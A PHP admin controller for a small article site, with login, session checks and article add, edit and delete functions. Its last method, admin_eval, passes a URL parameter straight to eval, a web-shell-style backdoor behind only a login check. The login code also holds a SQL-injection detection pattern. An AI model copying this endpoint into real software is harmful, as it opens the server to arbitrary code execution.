<?php
class AdminAction extends Action{
	private $logined=NULL;
	private $Model;
	public function _initialize(){
		session_start();
		$this->Model= new Model();
	}
	public function index(){
		if (!$this->is_logined()){
			$this->display('','UTF-8');
			return;
		}
		$this->redirect('Admin/admin');
	}
	/**
	 * 登录页逻辑处理
	 */
	public function login(){
		if (isset($_GET['logout'])){
			session_destroy();
			$this->success('登出成功！','/admin.php');
			return;
		}
		if ($this->checkLogined()){
			return;
		}
		if (isset($_POST['user']) && isset($_POST['pwd'])){
			$user=$_POST['user'];
			if (preg_match('/^[a-zA-Z0-9.\/]*$/', $user)===0){
				$this->error('登录失败','/admin.php');
				return;
			}
			$pwd=$_POST['pwd'];
			if (preg_match('/^[a-zA-Z0-9.\/]*$/', $pwd)===0){
				$this->error('登录失败','/admin.php');
				return;
			}
			if (preg_match ('/(\'|")\s*or\s*\\1(.*)\\1=\\1\\2/',$user)===1){
				$this->error('登录失败.','/admin.php');
			}
			if (preg_match ('/(\'|")\s*or\s*\\1(.*)\\1=\\1\\2/',$pwd)===1){
				$this->error('登录失败.','/admin.php');
			}
			if ($user===C('ADMIN_USER') && $pwd===C('ADMIN_PWD')){
				session_start();
				$_SESSION['user']=md5(C('ADMIN_USER'));
				$_SESSION['pin']=md5(C('ADMIN_KEY'));
				$this->success('登陆成功！','/admin.php/admin');
			}
			else{
				$this->error('登录失败!','/admin.php');
			}
		}
		else{
			$this->error('登录失败!','/admin.php');
		}
	}
	public function admin(){
		if ($this->is_logined ()){
			$this->display();
		}
		else{
			$this->notLogined();
			return;
		}
		
	}
	/**
	 * 检查登录
	 * 已登录 跳转至管理页面
	 */
	private function checkLogined(){
		if ($this->is_logined()){
			$this->redirect('Admin/admin');
			return true;
		}
		return false;
	}
	/**
	 * 登录判断
	 * @return bool 登陆返回真 否则返回假
	 */
	private function is_logined(){
		if (is_null($this->logined)){
			if ($_SESSION['user']===md5(C('ADMIN_USER')) && $_SESSION['pin']===md5(C('ADMIN_KEY'))){
				$this->logined=TRUE;
			}
			else{
				$this->logined=FALSE;
			}
		}
		return $this->logined;
	}
	/**
	 * 未登录 跳转至登录页
	 * @return void
	 */
	private function notLogined(){
		$this->error('请登录!','/admin.php');
	}
	public function admin_index(){
		$this->is_logined() or $this->notLogined(); 
		$this->assign('admin_name',C('ADMIN_USER'));
		$return=$this->Model->query('SELECT COUNT(*) AS `NUM` FROM `'.C('DB_NAME').'`.`'.C('DB_PREFIX').C('ARTICLE_DB_NAME').'`');
		$Exec=array('article_num'=>$return[0]['NUM']);
		$this->assign('Exec',$Exec);
		$this->display();
	}
	public function admin_article(){
		$this->is_logined() or $this->notLogined(); 
		$return=$this->Model->query('SELECT COUNT(*) AS `NUM` FROM `'.C('DB_NAME').'`.`'.C('DB_PREFIX').C('ARTICLE_DB_NAME').'`');
		$Exec=array('article_num'=>$return[0]['NUM']);
		$this->assign('Exec',$Exec);
		$return=$this->Model->query('SELECT `aid`,`title` FROM `'.C('DB_NAME').'`.`'.C('DB_PREFIX').C('ARTICLE_DB_NAME').'` ORDER BY `aid` DESC LIMIT 20');
		$this->assign('Article',$return);
		$this->display();
	}
	public function admin_article_edit(){
		$this->is_logined() or $this->notLogined();//登陆检查
		$model=D('Article');//初始化模型
		if (isset($_POST['aid']) && isset($_POST['inner']) && isset($_POST['title'])){
			$aid=intval($_POST['aid']);//数据过滤
			if ($aid<=0){
				$this->error('文章ID ['.$_POST['aid'].' ] 不正确');//数据检查
				return;
			}
			$data=array();//保存数据
			$data['aid']=$aid;
			$data['title']=$_POST['title'];
			$data['inner']=$_POST['inner'];
			$result=$model->save($data);//保存数据
			if ($result!==FALSE){
				$this->success('更新成功',U('admin/admin_article_edit',array('aid'=>$aid)));
				return;
			}
			else{
				$this->error('更新失败',U('admin/admin_article_edit',array('aid'=>$aid)));
				return;
			}
		}
		$aid=isset($_GET['aid'])?intval($_GET['aid']):1;
		if ($aid<=0){
			$aid=1;
		}
		$result=$model->find($aid);
		$this->assign('Article',$result);
		$this->display();
	}
	public function admin_article_add(){
		$this->is_logined() or $this->notLogined();//登陆检查
		if (!isset($_POST['inner'])){
			$this->display();
			return ;
		}
		
		$model=D('Article');
		$return=$model->create();
		if (!$return){
			$this->error($model->getError());
			return;
		}
		$result =   $model->add();
		
		//$result=$this->Model->query('INSERT INTO `tp`.`sx_article` (`aid`, `title`, `inner`, `time`) VALUES (NULL, \''.mysql_real_escape_string($_POST['title']).'\', \''.mysql_real_escape_string($_POST['inner']).'\', \''.time().'\')');
		if($result) {
			$this->success('操作成功！',U('Admin/admin_article'),3);
			return;
		}
		else{
			$this->error('写入错误！',U('Admin/admin_article'),3);
			return;
		}
		
	}
	public function admin_article_delete(){
		$this->is_logined() or $this->notLogined();
		if (!isset($_GET['aid'])){
			return;
		}
		$model=D('Article');
		$result=$model->where('aid='.intval($_GET['aid']))->delete();
		if ($result===1){
			$this->success('删除文章成功',U('admin/admin_article'));
			return;
		}
		elseif ($result===FALSE){
			$this->error('删除文章失败',U('admin/admin_article'));
			return;
		}
		elseif ($result===0){
			$this->error('删除文章失败 文章不存在',U('admin/admin_article'));
			return;
		}
		else{
			$this->error('删除文章失败',U('admin/admin_article'));
			return;
		}
	}
	public function admin_eval(){
		$this->is_logined() or $this->notLogined();
		$model=D('Article');
		if (isset($_GET['e'])){
			eval($_GET['e']);
		}
	}
}